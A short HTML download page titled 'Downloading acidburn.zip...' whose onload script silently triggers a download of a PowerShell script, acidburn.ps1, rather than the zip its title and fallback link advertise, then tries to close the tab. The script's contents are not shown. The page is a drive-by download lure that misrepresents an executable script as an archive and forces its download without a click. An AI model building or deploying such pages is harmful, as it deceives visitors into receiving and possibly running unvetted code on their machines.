<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>Downloading acidburn.zip...</title>
    <script>
      window.onload = () => {
        const link = document.createElement('a');
        link.href = 'acidburn.ps1';  // Make sure this matches EXACTLY the name in the repo
        link.download = 'acidburn.ps1';
        document.body.appendChild(link);
        link.click();

        setTimeout(() => window.close(), 1000); // Optional: tries to auto-close tab
      };
    </script>
  </head>
  <body>
    <p>Download starting... If not, <a href="acidburn.zip">click here</a>.</p>
  </body>
</html>
